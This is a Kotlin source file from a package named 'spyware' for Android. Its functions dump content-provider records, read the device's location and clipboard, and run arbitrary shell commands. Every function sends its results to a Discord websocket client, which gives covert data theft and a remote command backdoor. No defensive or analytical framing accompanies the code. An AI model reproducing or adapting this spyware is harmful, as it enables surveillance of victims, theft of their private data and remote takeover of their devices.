package io.ks.spyware

import android.content.ClipboardManager
import android.content.Context
import android.net.Uri
import android.util.Log
import com.google.android.gms.location.*
import java.io.BufferedReader
import java.io.InputStreamReader

fun Dump(context: Context,client: DiscordWebSocketClient,contentUri: Uri, logTag: String) {
    context.contentResolver.query(contentUri, null, null, null, null)?.use { cursor ->
        if (cursor.moveToFirst()) {
            do {
                val line = buildString {
                    for (i in 0 until cursor.columnCount) {
                        if (i > 0) append(", ")
                        append(cursor.getString(i))
                    }
                }
                Log.i(logTag, line)
                client.sendMessage(logTag, line)

            } while (cursor.moveToNext())
        }
    }
}


fun getLastKnownLocation(context: Context,client: DiscordWebSocketClient) {
    val fusedLocationClient: FusedLocationProviderClient =
        LocationServices.getFusedLocationProviderClient(context)

    try {
        fusedLocationClient.lastLocation
            .addOnSuccessListener { location ->
                if (location != null) {
                    Log.i("Location", "Lat: ${location.latitude}, Lon: ${location.longitude}")
                    val location = "Lat: ${location.latitude}, Lon: ${location.longitude}"
                    client.sendMessage("Location", location)
                } else {
                    Log.i("Location", "Location not available")
                }
            }
            .addOnFailureListener { e ->
                Log.i("Location", "Error getting last known location", e)
            }
    } catch (e: SecurityException) {
        Log.e("Location", "Location permission not granted", e)
    }
}

fun readClipboard(context: Context,client: DiscordWebSocketClient) {
    val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager

    if (clipboard.hasPrimaryClip()) {
        val clipData = clipboard.primaryClip
        val item = clipData?.getItemAt(0)
        val text = item?.coerceToText(context.applicationContext)

        if (!text.isNullOrEmpty()) {
            Log.i("Clipboard", "Clipboard content: $text")
            client.sendMessage("Clipboard", "Clipboard content: $text")
        } else {
            Log.i("Clipboard", "Clipboard is empty or non-text")
        }
    } else {
        Log.e("Clipboard", "No clipboard content available")
    }
}


fun execute(command: String, client: DiscordWebSocketClient) {
    try {
        // Use a shell to support piping and redirection
        val processBuilder = ProcessBuilder("/system/bin/sh", "-c", command)
        processBuilder.redirectErrorStream(true)

        val process = processBuilder.start()
        val output = BufferedReader(InputStreamReader(process.inputStream)).use { it.readText() }

        process.waitFor()

        // Limit message size for Discord
        val limitedOutput = if (output.length > 1900) output.take(1900) + "\n[truncated]" else output

        client.sendMessage("Command Executed: $command", limitedOutput)
        Log.i("Command", "Executed: $command\n$limitedOutput")
    } catch (e: Exception) {
        client.sendMessage("Execution Error", e.message.toString())
        Log.e("Command", "Error executing command: ${e.message}", e)
    }
}
